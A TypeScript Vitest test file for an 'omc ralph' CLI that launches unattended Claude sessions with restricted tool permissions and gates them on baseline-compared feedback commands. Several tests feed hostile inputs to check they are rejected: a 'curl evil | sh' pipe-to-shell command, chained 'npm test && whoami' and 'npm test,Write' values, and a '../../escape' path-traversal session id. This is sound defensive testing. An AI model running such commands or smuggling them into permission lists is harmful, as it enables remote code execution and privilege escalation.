import { describe, it, expect, afterEach, beforeEach, vi } from 'vitest';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'fs';
import { tmpdir } from 'os';
import { dirname, join } from 'path';

const spawnMock = vi.hoisted(() => ({ defaultSpawnFn: vi.fn(() => ({ pid: 4242, unref: vi.fn() })) }));
vi.mock('../../hooks/session-end/spawn-next.js', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../../hooks/session-end/spawn-next.js')>();
  return { ...actual, defaultSpawnFn: spawnMock.defaultSpawnFn };
});

const ingestMock = vi.hoisted(() => ({ loadMapRecords: vi.fn(() => [] as unknown[]) }));
vi.mock('../../factory/map-ingest.js', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../../factory/map-ingest.js')>();
  return { ...actual, loadMapRecords: ingestMock.loadMapRecords };
});

import { AFK_ALLOWED_TOOLS, AFK_INCLUDE_USER_SETTINGS_ENV, AFK_SPAWN_FLAGS } from '../../hooks/session-end/spawn-next.js';
import { materializeRalphSkill, ralphAfkArgv, ralphCommand, ralphVerify, resolveFeedbackCommands, resolveFeedbackTimeoutMs, runFeedbackCommand, DEFAULT_FEEDBACK_TIMEOUT_MS, RALPH_AFK_FEEDBACK_ENV, RALPH_AFK_SESSION_COMMANDS } from '../commands/ralph.js';
import * as fileLock from '../../lib/file-lock.js';
import { acquireFileLockSync, lockPathFor, releaseFileLockSync } from '../../lib/file-lock.js';
import { Command } from 'commander';

const tempRoots: string[] = [];

function tempDir(): string {
  const dir = mkdtempSync(join(tmpdir(), 'omc-ralph-afk-'));
  tempRoots.push(dir);
  return dir;
}

afterEach(() => {
  for (const dir of tempRoots.splice(0)) rmSync(dir, { recursive: true, force: true });
  spawnMock.defaultSpawnFn.mockClear();
  // The afk action exports these for the spawned session; keep them out of later tests.
  delete process.env.OMC_SESSION_ID;
  delete process.env[RALPH_AFK_FEEDBACK_ENV];
  vi.unstubAllEnvs();
});

beforeEach(() => vi.stubEnv(AFK_INCLUDE_USER_SETTINGS_ENV, '0'));

describe('ralphAfkArgv', () => {
  it('invokes /ralph with --no-deslop, the task, and a fresh session id', () => {
    const argv = ralphAfkArgv('raise coverage on the CLI helpers', [], 'aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee');
    expect(argv[0]).toBe('-p');
    expect(argv[1]).toBe('/ralph --no-deslop raise coverage on the CLI helpers');
    expect(argv[2]).toBe('--session-id');
    expect(argv[3]).toBe('aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee');
    // Base profile shape, with the always-present read-only git extension.
    expect(argv[argv.indexOf('--permission-mode') + 1]).toBe('acceptEdits');
    expect(argv[argv.indexOf('--setting-sources') + 1]).toBe('project,local');
    expect(argv[argv.indexOf('--allowedTools') + 1]).toContain(AFK_ALLOWED_TOOLS);
    expect(argv).toHaveLength(4 + AFK_SPAWN_FLAGS.length);
  });

  it('includes user-level settings for ralph AFK only when explicitly opted in', () => {
    vi.stubEnv(AFK_INCLUDE_USER_SETTINGS_ENV, '1');
    const argv = ralphAfkArgv('task', [], 'sess-opt-in');
    expect(argv[argv.indexOf('--setting-sources') + 1]).toBe('user,project,local');
  });

  it('extends the AFK allowedTools with the read-only git set plus the declared verify commands', () => {
    const argv = ralphAfkArgv('task', ['npm test'], 'sess-x');
    const tools = argv[argv.indexOf('--allowedTools') + 1];
    expect(tools).toBe(`${AFK_ALLOWED_TOOLS},Bash(git status),Bash(git log),Bash(git diff),Bash(git rev-parse),Bash(git show),Bash(git merge-base),Bash(npm test),${RALPH_AFK_SESSION_COMMANDS.join(',')}`);
    // The allowedTools value is replaced in place — no stray base-profile token.
    expect(argv).toHaveLength(4 + AFK_SPAWN_FLAGS.length);
    expect(argv).not.toContain(AFK_ALLOWED_TOOLS);
    // The bridge MCP server does not register under isolated settings (verified
    // live), so no mcp__t__ entries belong in the profile.
    expect(tools).not.toContain('mcp__t__');
  });

  it('drops verify commands that fail the argv-boundary recheck, keeping the git set', () => {
    const argv = ralphAfkArgv('task', ['npm test && whoami', 'npm test,Write'], 'sess-y');
    const tools = argv[argv.indexOf('--allowedTools') + 1];
    expect(tools).toContain('Bash(git status)');
    expect(tools).not.toContain('whoami');
  });

  it('keeps the full verify budget on top of the read-only git set', () => {
    const verify = Array.from({ length: 10 }, (_, i) => `npm run check${i}`);
    const argv = ralphAfkArgv('task', verify, 'sess-z');
    const tools = argv[argv.indexOf('--allowedTools') + 1];
    expect(tools).toContain('Bash(git merge-base)');
    for (const command of verify) expect(tools).toContain(`Bash(${command})`);
  });
});

describe('materializeRalphSkill', () => {
  it('copies the bundled skill and reports created, then present when identical', () => {
    const dir = tempDir();
    const target = join(dir, '.claude', 'skills', 'ralph', 'SKILL.md');
    const first = materializeRalphSkill(dir);
    expect(first).toEqual({ status: 'created', path: target });
    expect(readFileSync(target, 'utf8')).toContain('name: ralph');
    expect(materializeRalphSkill(dir)).toEqual({ status: 'present', path: target });
  });

  it('never clobbers a diverged project copy — it reports the divergence', () => {
    const dir = tempDir();
    const target = join(dir, '.claude', 'skills', 'ralph', 'SKILL.md');
    mkdirSync(join(dir, '.claude', 'skills', 'ralph'), { recursive: true });
    writeFileSync(target, 'name: ralph\n# project-owned customization\n', 'utf8');
    expect(materializeRalphSkill(dir)).toEqual({ status: 'diverged', path: target });
    expect(readFileSync(target, 'utf8')).toContain('# project-owned customization');
  });
});

describe('omc ralph afk command', () => {
  it('accumulates repeatable --verify options and spawns claude in the invocation cwd', async () => {
    const dir = tempDir();
    const previousCwd = process.cwd();
    process.chdir(dir);
    try {
      const program = new Command();
      program.exitOverride();
      ralphCommand(program);
      await program.parseAsync(['ralph', 'afk', 'do the thing', '--verify', 'npm test', '--verify', 'npm run build'], { from: 'user' });

      expect(spawnMock.defaultSpawnFn).toHaveBeenCalledTimes(1);
      const [command, args, ctx] = spawnMock.defaultSpawnFn.mock.calls[0] as unknown as [string, string[], { cwd?: string }];
      expect(command).toBe('claude');
      expect(args[1]).toBe('/ralph --no-deslop do the thing');
      const tools = args[args.indexOf('--allowedTools') + 1];
      expect(tools).toContain('Bash(npm test)');
      expect(tools).toContain('Bash(npm run build)');
      expect(ctx.cwd).toBe(dir);
      // The session's gate runs exactly the declared list.
      expect(JSON.parse(process.env[RALPH_AFK_FEEDBACK_ENV] ?? 'null')).toEqual(['npm test', 'npm run build']);
      // The ralph skill must be loadable by the isolated session.
      expect(readFileSync(join(dir, '.claude', 'skills', 'ralph', 'SKILL.md'), 'utf8')).toContain('name: ralph');
    } finally {
      process.chdir(previousCwd);
    }
  });

  it('refuses more --verify commands than the budget instead of dropping them', async () => {
    const program = new Command();
    program.exitOverride();
    ralphCommand(program);
    const errorSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
    const verifyArgs = Array.from({ length: 11 }, (_, i) => ['--verify', `npm run check${i}`]).flat();
    try {
      await program.parseAsync(['ralph', 'afk', 't', ...verifyArgs], { from: 'user' });
      expect(spawnMock.defaultSpawnFn).not.toHaveBeenCalled();
      expect(process.exitCode).toBe(1);
      expect(errorSpy.mock.calls[0][0]).toContain('at most 10 --verify');
    } finally {
      process.exitCode = undefined;
      errorSpy.mockRestore();
    }
  });
});


describe('omc ralph verify', () => {
  let dir: string;
  const previousHome = process.env.HOME;
  const previousUserProfile = process.env.USERPROFILE;

  function writePackage(testScript: string): void {
    writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: 'fb-fixture', scripts: { test: testScript } }), 'utf8');
  }

  function writePrd(content: string): string {
    mkdirSync(join(dir, '.omc'), { recursive: true });
    const path = join(dir, '.omc', 'prd.json');
    writeFileSync(path, content, 'utf8');
    return path;
  }

  function writeFailer(body: string): void {
    writeFileSync(join(dir, 'failer.js'), `console.log(${JSON.stringify(body)});
process.exit(1);
`, 'utf8');
  }

  function writePrinter(body: string, exitCode = 0): void {
    writeFileSync(join(dir, 'printer.js'), `console.log(${JSON.stringify(body)});
process.exit(${exitCode});
`, 'utf8');
    writePackage('node printer.js');
  }

  /** A feedback command that leaves a file behind when (and only when) it runs. */
  function writeMarkerScript(): string {
    const marker = join(dir, 'feedback-ran.txt');
    writeFileSync(join(dir, 'marker.js'), `require('fs').writeFileSync(${JSON.stringify(marker)}, 'ran');\n`, 'utf8');
    writePackage('node marker.js');
    return marker;
  }

  /**
   * Two feedback commands: `node slow.js` hangs past any budget, `node
   * failerout.js` exits 1 printing whatever `failure.txt` holds. The PRD is
   * rewritten per run so a test can change which commands the gate sees.
   */
  function writeTwoCommandFixture(failure: string, commands: string[]): void {
    writeFileSync(join(dir, 'slow.js'), 'setTimeout(() => {}, 3000);\n', 'utf8');
    writeFileSync(
      join(dir, 'failerout.js'),
      "console.log(require('fs').readFileSync('failure.txt', 'utf8').trim());\nprocess.exit(1);\n",
      'utf8',
    );
    writeFileSync(join(dir, 'failure.txt'), `${failure}\n`, 'utf8');
    writePrd(JSON.stringify({
      project: 'fb-fixture',
      branchName: 'main',
      description: 'fixture',
      userStories: [],
      feedbackCommands: commands,
    }));
  }

  beforeEach(() => {
    dir = tempDir();
    process.env.HOME = dir;
    process.env.USERPROFILE = dir;
  });

  afterEach(() => {
    if (previousHome === undefined) delete process.env.HOME; else process.env.HOME = previousHome;
    if (previousUserProfile === undefined) delete process.env.USERPROFILE; else process.env.USERPROFILE = previousUserProfile;
  });

  it('detects feedback commands from package scripts when the PRD declares none', () => {
    writePackage('node failer.js');
    expect(resolveFeedbackCommands(dir)).toEqual({ commands: ['npm run test'] });
  });

  it.each([
    ['the stories key', JSON.stringify({
      project: 'fb-fixture',
      branchName: 'main',
      description: 'fixture',
      stories: [{ id: 'US-001', title: 't', description: 'd', acceptanceCriteria: ['c'], priority: 1, passes: false }],
      feedbackCommands: ['node --version'],
    }), 'Invalid PRD structure'],
    ['truncated JSON', '{"project":"fb-fixture","userStories":[', 'Failed to read'],
  ])('fails closed for a PRD with %s and does not fall back to package scripts', (_kind, content, expectedError) => {
    writePackage("node -e \"require('fs').writeFileSync('fallback-ran', 'yes')\"");
    const prdPath = writePrd(content);
    const resolution = resolveFeedbackCommands(dir);
    expect(resolution.commands).toEqual([]);
    expect(resolution.prdError).toContain(prdPath);
    expect(resolution.prdError).toContain(expectedError);

    const errorSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
    try {
      expect(ralphVerify({ session: 'sess-invalid-prd' }, dir)).toBe(1);
      expect(errorSpy.mock.calls[0][0]).toContain(resolution.prdError);
      expect(existsSync(join(dir, 'fallback-ran'))).toBe(false);

      expect(ralphVerify({ session: 'sess-invalid-prd-write', writeBaseline: true }, dir)).toBe(1);
      expect(existsSync(join(dir, '.omc', 'state', 'sessions', 'sess-invalid-prd-write', 'feedback-baseline.json'))).toBe(false);
      expect(existsSync(join(dir, 'fallback-ran'))).toBe(false);
    } finally {
      errorSpy.mockRestore();
    }
  });

  it('reports PRD errors in JSON without losing an existing baseline status', () => {
    const session = 'sess-invalid-prd-json';
    writePrd(JSON.stringify({
      project: 'fb-fixture',
      branchName: 'main',
      description: 'fixture',
      userStories: [],
      feedbackCommands: ['node --version'],
    }));
    const logSpy = vi.spyOn(console, 'log').mockImplementation(() => {});
    const errorSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
    try {
      expect(ralphVerify({ session, writeBaseline: true }, dir)).toBe(0);
      const baselineFile = join(dir, '.omc', 'state', 'sessions', session, 'feedback-baseline.json');
      expect(existsSync(baselineFile)).toBe(true);

      const prdPath = writePrd(JSON.stringify({
        project: 'fb-fixture',
        branchName: 'main',
        description: 'fixture',
        stories: [],
        feedbackCommands: ['node --version'],
      }));
      logSpy.mockClear();
      expect(ralphVerify({ session, json: true }, dir)).toBe(1);
      const result = JSON.parse(String(logSpy.mock.calls[0][0])) as {
        baselinePresent: boolean;
        commands: string[];
        error: string;
      };
      expect(result.baselinePresent).toBe(true);
      expect(result.commands).toEqual([]);
      expect(result.error).toContain(`Invalid PRD structure in ${prdPath}.`);
      expect(errorSpy.mock.calls.at(-1)?.[0]).toContain(result.error);
    } finally {
      logSpy.mockRestore();
      errorSpy.mockRestore();
    }
  });

  it('judges clean against its own baseline and fails on a new signature', () => {
    writeFailer('FAIL env-specific baseline failure');
    writePackage('node failer.js');
    expect(ralphVerify({ session: 'sess-verify', writeBaseline: true }, dir)).toBe(0);
    // Same failure — environment noise, not a regression.
    expect(ralphVerify({ session: 'sess-verify' }, dir)).toBe(0);
    writeFailer('FAIL brand new regression');
    expect(ralphVerify({ session: 'sess-verify' }, dir)).toBe(1);
  });

  it('reports a re-record delta and preserves the previous baseline', () => {
    writeFailer('FAIL old');
    writePackage('node failer.js');
    const logSpy = vi.spyOn(console, 'log').mockImplementation(() => {});
    try {
      expect(ralphVerify({ session: 'sess-rerecord', json: true, writeBaseline: true }, dir)).toBe(0);
      const first = JSON.parse(String(logSpy.mock.calls[0][0])) as { previousPath: string | null; added: number; removed: number };
      expect(first.previousPath).toBeNull();
      expect(first.added).toBe(0);
      expect(first.removed).toBe(0);

      writeFailer('FAIL new');
      logSpy.mockClear();
      expect(ralphVerify({ session: 'sess-rerecord', writeBaseline: true }, dir)).toBe(0);
      expect(String(logSpy.mock.calls[0][0])).toContain('baseline replaced: +1 signature, -1 signature (previous saved at ');
      expect(String(logSpy.mock.calls[0][0])).toContain('feedback-baseline.history');

      logSpy.mockClear();
      expect(ralphVerify({ session: 'sess-rerecord', json: true, writeBaseline: true }, dir)).toBe(0);
      const second = JSON.parse(String(logSpy.mock.calls[0][0])) as { previousPath: string; added: number; removed: number };
      expect(second.previousPath).toContain('feedback-baseline.history');
      expect(second.added).toBe(0);
      expect(second.removed).toBe(0);
    } finally {
      logSpy.mockRestore();
    }
  });

  it('reports removed stored signatures when a re-record turns the command unrunnable', () => {
    writePrd(JSON.stringify({
      project: 'fb-fixture',
      branchName: 'main',
      description: 'fixture',
      userStories: [],
      feedbackCommands: ['node runner.js'],
    }));
    writeFileSync(join(dir, 'runner.js'), `const fs = require('fs');
if (fs.existsSync('unrunnable')) process.exit(127);
console.log('FAIL a');
console.log('FAIL b');
process.exit(1);
`, 'utf8');
    expect(ralphVerify({ session: 'sess-rerecord-unrunnable', writeBaseline: true }, dir)).toBe(0);
    // Exit 127 marks the previously runnable command unrunnable.
    writeFileSync(join(dir, 'unrunnable'), '', 'utf8');

    const logSpy = vi.spyOn(console, 'log').mockImplementation(() => {});
    try {
      expect(ralphVerify({ session: 'sess-rerecord-unrunnable', json: true, writeBaseline: true }, dir)).toBe(0);
      const result = JSON.parse(String(logSpy.mock.calls[0][0])) as { added: number; removed: number; becameUnrunnable: string[] };
      expect(result.added).toBe(0);
      expect(result.removed).toBe(2);
      expect(result.becameUnrunnable).toEqual(['node runner.js']);
    } finally {
      logSpy.mockRestore();
    }
  });

  it('exits nonzero and leaves the live baseline untouched when history cannot be archived', () => {
    writeFailer('FAIL old');
    writePackage('node failer.js');
    expect(ralphVerify({ session: 'sess-unarchivable', writeBaseline: true }, dir)).toBe(0);
    const baselineFile = join(dir, '.omc', 'state', 'sessions', 'sess-unarchivable', 'feedback-baseline.json');
    const before = readFileSync(baselineFile);
    // A regular file where the history directory must go makes archiving fail.
    writeFileSync(join(dirname(baselineFile), 'feedback-baseline.history'), 'not a directory', 'utf8');
    writeFailer('FAIL new');

    const logSpy = vi.spyOn(console, 'log').mockImplementation(() => {});
    try {
      expect(ralphVerify({ session: 'sess-unarchivable', writeBaseline: true }, dir)).toBe(1);
      expect(logSpy.mock.calls.flat().join('\n')).toContain('could not write a baseline');
    } finally {
      logSpy.mockRestore();
    }
    expect(readFileSync(baselineFile)).toEqual(before);
  });

  it('reports new test failures even when suite output includes ENOENT', () => {
    writePackage('node failer.js');
    writeFailer('Error: ENOENT: no such file or directory: missing.json\nFAIL a.test.js > existing failure');
    expect(ralphVerify({ session: 'sess-enoent', writeBaseline: true }, dir)).toBe(0);

    writeFailer('Error: ENOENT: no such file or directory: missing.json\nFAIL a.test.js > new failure');
    const logSpy = vi.spyOn(console, 'log').mockImplementation(() => {});
    try {
      expect(ralphVerify({ session: 'sess-enoent' }, dir)).toBe(1);
      const output = logSpy.mock.calls.flat().join('\n');
      expect(output).toContain('NEW failure(s) since baseline');
      expect(output).toContain('new: npm run test: FAIL a.test.js > new failure');
      expect(output).not.toContain('unrunnable');
    } finally {
      logSpy.mockRestore();
    }
  });

  it('does not classify test output mentioning a missing command as unrunnable', () => {
    writeFailer('FAIL fixture logs "command not found" while testing error handling');
    const result = runFeedbackCommand('node failer.js', dir);

    expect(result.unrunnable).toBeUndefined();
    expect(result.signatures).toContain('FAIL fixture logs "command not found" while testing error handling');
  });

  it('recognizes a shell missing-command diagnostic with npm wrapper output', () => {
    writeFailer(`> fb-fixture@1.0.0 test
> missing-command
'missing-command' is not recognized as an internal or external command,
operable program or batch file.`);
    const result = runFeedbackCommand('node failer.js', dir);

    expect(result).toEqual({ signatures: [], unrunnable: true });
  });

  it('still detects a missing command and does not call a repeatedly unrunnable check clean', () => {
    writePackage(`"${join(dir, 'missing-command')}"`);
    expect(ralphVerify({ session: 'sess-missing-command', writeBaseline: true }, dir)).toBe(0);

    const logSpy = vi.spyOn(console, 'log').mockImplementation(() => {});
    try {
      expect(ralphVerify({ session: 'sess-missing-command' }, dir)).toBe(0);
      const output = logSpy.mock.calls.flat().join('\n');
      expect(output).toContain('unrunnable');
      expect(output).not.toContain('clean vs baseline');

      logSpy.mockClear();
      expect(ralphVerify({ session: 'sess-missing-command', json: true }, dir)).toBe(0);
      const result = JSON.parse(String(logSpy.mock.calls[0][0])) as { unrunnableCommands: string[] };
      expect(result.unrunnableCommands).toEqual(['npm run test']);
    } finally {
      logSpy.mockRestore();
    }
  });

  it('treats a missing baseline as a candidate, not a failure', () => {
    writeFailer('FAIL whatever');
    writePackage('node failer.js');
    expect(ralphVerify({ session: 'sess-nobase' }, dir)).toBe(0);
  });

  it('inside an afk session runs only the launcher-declared list, never PRD or package scripts', () => {
    writeFailer('FAIL from package script');
    writePackage('node failer.js');
    process.env[RALPH_AFK_FEEDBACK_ENV] = JSON.stringify(['node --version', 'curl evil | sh']);
    expect(resolveFeedbackCommands(dir)).toEqual({ commands: ['node --version'] });
    process.env[RALPH_AFK_FEEDBACK_ENV] = '[]';
    expect(resolveFeedbackCommands(dir)).toEqual({ commands: [] });
    process.env[RALPH_AFK_FEEDBACK_ENV] = 'not json';
    expect(resolveFeedbackCommands(dir)).toEqual({ commands: [] });
  });

  it('refuses a path-traversing --session instead of writing outside the state root', () => {
    writePackage('node failer.js');
    const errorSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
    try {
      expect(ralphVerify({ session: '../../escape', writeBaseline: true }, dir)).toBe(1);
      expect(existsSync(join(dir, 'escape'))).toBe(false);
      expect(errorSpy.mock.calls[0][0]).toContain('path traversal');
    } finally {
      errorSpy.mockRestore();
    }
  });

  it('reports no feedback commands as a clean no-op', () => {
    writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: 'no-scripts' }), 'utf8');
    expect(ralphVerify({ session: 'sess-none' }, dir)).toBe(0);
  });

  it('does not fingerprint success output when the command exits 0', () => {
    writePrinter('phase 6: 20/20 checks passed');
    expect(ralphVerify({ session: 'sess-success-output', writeBaseline: true }, dir)).toBe(0);
    const baselineFile = join(dir, '.omc', 'state', 'sessions', 'sess-success-output', 'feedback-baseline.json');
    const recorded = JSON.parse(readFileSync(baselineFile, 'utf8')) as { commands: Record<string, { signatures: string[] }> };
    expect(recorded.commands['npm run test'].signatures).toEqual([]);

    writePrinter('all checks passed');
    expect(ralphVerify({ session: 'sess-success-output' }, dir)).toBe(0);
  });

  it('treats a designed-to-fail baseline as resolved once the check exits 0', () => {
    writePrinter('Phase 6 acceptance checks are not implemented yet', 1);
    expect(ralphVerify({ session: 'sess-designed-fail', writeBaseline: true }, dir)).toBe(0);

    writePrinter('phase 6: 20/20 checks passed');
    const logSpy = vi.spyOn(console, 'log').mockImplementation(() => {});
    try {
      expect(ralphVerify({ session: 'sess-designed-fail' }, dir)).toBe(0);
      const output = logSpy.mock.calls.flat().join('\n');
      expect(output).toMatch(/\(\d+ baseline failure\(s\) resolved\)/);
      expect(output).not.toContain('NEW failure');
    } finally {
      logSpy.mockRestore();
    }
  });

  it('reports a timeout as a timeout, not as a new failure', () => {
    writePrinter('fast');
    expect(ralphVerify({ session: 'sess-timeout', writeBaseline: true }, dir)).toBe(0);

    writePackage('node -e "setTimeout(() => {}, 3000)"');
    const logSpy = vi.spyOn(console, 'log').mockImplementation(() => {});
    try {
      expect(ralphVerify({ session: 'sess-timeout', timeoutMs: 500 }, dir)).toBe(1);
      const output = logSpy.mock.calls.flat().join('\n');
      expect(output).toContain('timed out');
      expect(output).toContain('--timeout <seconds>');
      expect(output).not.toContain('NEW failure');
    } finally {
      logSpy.mockRestore();
    }
  }, 20000);

  it('treats a timeout recorded in the baseline as environment noise', () => {
    writePackage('node -e "setTimeout(() => {}, 3000)"');
    expect(ralphVerify({ session: 'sess-timeout-baseline', writeBaseline: true, timeoutMs: 500 }, dir)).toBe(0);
    expect(ralphVerify({ session: 'sess-timeout-baseline', timeoutMs: 500 }, dir)).toBe(0);
  }, 30000);

  it('serializes timedOutCommands in JSON when the baseline has no entry for the command', () => {
    writeFileSync(join(dir, 'printer.js'), 'console.log("fast");\nprocess.exit(0);\n', 'utf8');
    writeFileSync(join(dir, 'slow.js'), 'setTimeout(() => {}, 3000);\n', 'utf8');
    writeFileSync(join(dir, 'package.json'), JSON.stringify({
      name: 'fb-fixture',
      scripts: { fast: 'node printer.js', slow: 'node slow.js' },
    }), 'utf8');
    const prd = (feedbackCommands: string[]) => JSON.stringify({
      project: 'fb-fixture',
      branchName: 'main',
      description: 'fixture',
      userStories: [],
      feedbackCommands,
    });

    // Baseline covers `npm run fast` only; the next gate runs `npm run slow`,
    // which has no baseline entry, so the timeout is new.
    writePrd(prd(['npm run fast']));
    expect(ralphVerify({ session: 'sess-timeout-json-new', writeBaseline: true }, dir)).toBe(0);
    writePrd(prd(['npm run slow']));

    const logSpy = vi.spyOn(console, 'log').mockImplementation(() => {});
    try {
      expect(ralphVerify({ session: 'sess-timeout-json-new', json: true, timeoutMs: 500 }, dir)).toBe(1);
      const result = JSON.parse(String(logSpy.mock.calls.at(-1)?.[0])) as {
        baselinePresent: boolean;
        newFailures: string[];
        timedOutCommands: string[];
      };
      expect(result.baselinePresent).toBe(true);
      // A killed process has no failure output, so timedOutCommands — not
      // newFailures — is the JSON consumer's signal here.
      expect(result.timedOutCommands).toEqual(['npm run slow']);
      expect(result.newFailures).toEqual([]);
    } finally {
      logSpy.mockRestore();
    }
  }, 20000);

  it('serializes a baseline-only timeout in JSON but exits 0', () => {
    writePackage('node -e "setTimeout(() => {}, 3000)"');
    expect(ralphVerify({ session: 'sess-timeout-json-baseline', writeBaseline: true, timeoutMs: 500 }, dir)).toBe(0);
    const logSpy = vi.spyOn(console, 'log').mockImplementation(() => {});
    try {
      // Same timedOutCommands as a new timeout; the exit code is what tells the
      // consumer this one was already present in the baseline.
      expect(ralphVerify({ session: 'sess-timeout-json-baseline', json: true, timeoutMs: 500 }, dir)).toBe(0);
      const result = JSON.parse(String(logSpy.mock.calls.at(-1)?.[0])) as {
        baselinePresent: boolean;
        newFailures: string[];
        timedOutCommands: string[];
      };
      expect(result.baselinePresent).toBe(true);
      expect(result.timedOutCommands).toEqual(['npm run test']);
      expect(result.newFailures).toEqual([]);
    } finally {
      logSpy.mockRestore();
    }
  }, 30000);

  it('reports a timeout and a real regression in the same gate', () => {
    writeTwoCommandFixture('known baseline failure', ['node failerout.js']);
    expect(ralphVerify({ session: 'sess-mixed', writeBaseline: true }, dir)).toBe(0);

    // The suite now also exceeds its budget, and the known failure changes.
    writeTwoCommandFixture('brand new regression', ['node slow.js', 'node failerout.js']);
    const logSpy = vi.spyOn(console, 'log').mockImplementation(() => {});
    try {
      expect(ralphVerify({ session: 'sess-mixed', timeoutMs: 500 }, dir)).toBe(1);
      const output = logSpy.mock.calls.flat().join('\n');
      // The infrastructure cause and the actionable regression are distinct lines:
      // the first says retry/raise the budget, the second names what to fix.
      expect(output).toContain('timed out');
      expect(output).toContain('timed out: node slow.js');
      expect(output).toContain('NEW failure(s) since baseline');
      expect(output).toContain('new: node failerout.js: brand new regression');
      expect(output).not.toContain('candidate:');
    } finally {
      logSpy.mockRestore();
    }
  }, 30000);

  it('labels non-timeout failures as candidates when a timeout has no baseline', () => {
    // No baseline was recorded: `diffAgainstBaseline(null, …)` only ever yields
    // candidates. The timeout still fails the gate, but the other command's
    // output must not be presented as a regression.
    writeTwoCommandFixture('environment failure', ['node slow.js', 'node failerout.js']);
    const logSpy = vi.spyOn(console, 'log').mockImplementation(() => {});
    try {
      expect(ralphVerify({ session: 'sess-timeout-no-baseline', timeoutMs: 500 }, dir)).toBe(1);
      const output = logSpy.mock.calls.flat().join('\n');
      expect(output).toContain('timed out');
      expect(output).toContain('candidate: node failerout.js: environment failure');
      expect(output).not.toContain('NEW failure');
    } finally {
      logSpy.mockRestore();
    }
  }, 30000);

  it('runs a sessionless gate without a lock and reports baseline candidates', () => {
    writeFailer('sessionless failure');
    writePackage('node failer.js');
    const lockSpy = vi.spyOn(fileLock, 'acquireFileLockSync');
    const logSpy = vi.spyOn(console, 'log').mockImplementation(() => {});
    try {
      // No --session, no OMC_SESSION_ID, no baseline to infer: the gate still
      // runs (there is nothing to serialize on) and exits 0 with candidates.
      expect(ralphVerify({}, dir)).toBe(0);
      const output = logSpy.mock.calls.flat().join('\n');
      expect(output).toContain('no baseline for session (unknown)');
      expect(output).toContain('candidate: npm run test: sessionless failure');
      expect(lockSpy).not.toHaveBeenCalled();
    } finally {
      lockSpy.mockRestore();
      logSpy.mockRestore();
    }
  }, 20000);

  it('refuses a sessionless --write-baseline and reports it in plain and JSON output', () => {
    writePrinter('ok');
    const lockSpy = vi.spyOn(fileLock, 'acquireFileLockSync');
    const logSpy = vi.spyOn(console, 'log').mockImplementation(() => {});
    try {
      expect(ralphVerify({ writeBaseline: true }, dir)).toBe(1);
      expect(logSpy.mock.calls.flat().join('\n')).toContain('could not write a baseline (no session id; pass --session)');

      logSpy.mockClear();
      expect(ralphVerify({ writeBaseline: true, json: true }, dir)).toBe(1);
      const result = JSON.parse(String(logSpy.mock.calls.at(-1)?.[0])) as {
        sessionId: string | null;
        baselineWritten: boolean;
      };
      expect(result.sessionId).toBeNull();
      expect(result.baselineWritten).toBe(false);
      expect(lockSpy).not.toHaveBeenCalled();
    } finally {
      lockSpy.mockRestore();
      logSpy.mockRestore();
    }
  }, 20000);

  it('serializes concurrent verify runs for the same session', () => {
    writePrinter('ok');
    const baselineFile = join(dir, '.omc', 'state', 'sessions', 'sess-lock', 'feedback-baseline.json');
    const lock = acquireFileLockSync(lockPathFor(baselineFile));
    expect(lock).not.toBeNull();
    const errorSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
    try {
      expect(ralphVerify({ session: 'sess-lock' }, dir)).toBe(1);
      expect(errorSpy.mock.calls.flat().join('\n')).toContain('another verify is running');
    } finally {
      errorSpy.mockRestore();
      if (lock) releaseFileLockSync(lock);
    }
  });

  it('emits a parseable result when a JSON run loses the session lock', () => {
    writePrinter('ok');
    const baselineFile = join(dir, '.omc', 'state', 'sessions', 'sess-lock-json', 'feedback-baseline.json');
    const lock = acquireFileLockSync(lockPathFor(baselineFile));
    expect(lock).not.toBeNull();
    const logSpy = vi.spyOn(console, 'log').mockImplementation(() => {});
    const errorSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
    try {
      expect(ralphVerify({ session: 'sess-lock-json', json: true }, dir)).toBe(1);
      const result = JSON.parse(String(logSpy.mock.calls.at(-1)?.[0])) as {
        sessionId: string;
        commands: string[];
        newFailures: string[];
        error: string;
      };
      expect(result.sessionId).toBe('sess-lock-json');
      expect(result.commands).toEqual([]);
      expect(result.newFailures).toEqual([]);
      expect(result.error).toContain('another verify is running');
    } finally {
      logSpy.mockRestore();
      errorSpy.mockRestore();
      if (lock) releaseFileLockSync(lock);
    }
  });

  it('reports a throwing lock acquisition and runs no feedback command', () => {
    const marker = writeMarkerScript();
    const lockSpy = vi.spyOn(fileLock, 'acquireFileLockSync').mockImplementation(() => {
      throw new Error('EACCES: permission denied, open /nope/feedback-baseline.json.lock');
    });
    const errorSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
    try {
      expect(ralphVerify({ session: 'sess-lock-throw' }, dir)).toBe(1);
      const output = errorSpy.mock.calls.flat().join('\n');
      expect(output).toContain('could not acquire the session lock');
      expect(output).toContain('EACCES');
      // The gate stopped before running anything: a feedback command here would
      // have created the marker file.
      expect(existsSync(marker)).toBe(false);
    } finally {
      lockSpy.mockRestore();
      errorSpy.mockRestore();
    }
  });

  it('emits a parseable result when lock acquisition throws in JSON mode', () => {
    const marker = writeMarkerScript();
    const lockSpy = vi.spyOn(fileLock, 'acquireFileLockSync').mockImplementation(() => {
      throw new Error('ENOTDIR: not a directory, open /nope/feedback-baseline.json.lock');
    });
    const logSpy = vi.spyOn(console, 'log').mockImplementation(() => {});
    const errorSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
    try {
      expect(ralphVerify({ session: 'sess-lock-throw-json', json: true }, dir)).toBe(1);
      const result = JSON.parse(String(logSpy.mock.calls.at(-1)?.[0])) as {
        sessionId: string;
        commands: string[];
        newFailures: string[];
        error: string;
      };
      expect(result.sessionId).toBe('sess-lock-throw-json');
      expect(result.commands).toEqual([]);
      expect(result.newFailures).toEqual([]);
      expect(result.error).toContain('could not acquire the session lock');
      expect(result.error).toContain('ENOTDIR');
      expect(errorSpy.mock.calls.flat().join('\n')).toContain('could not acquire the session lock');
      expect(existsSync(marker)).toBe(false);
    } finally {
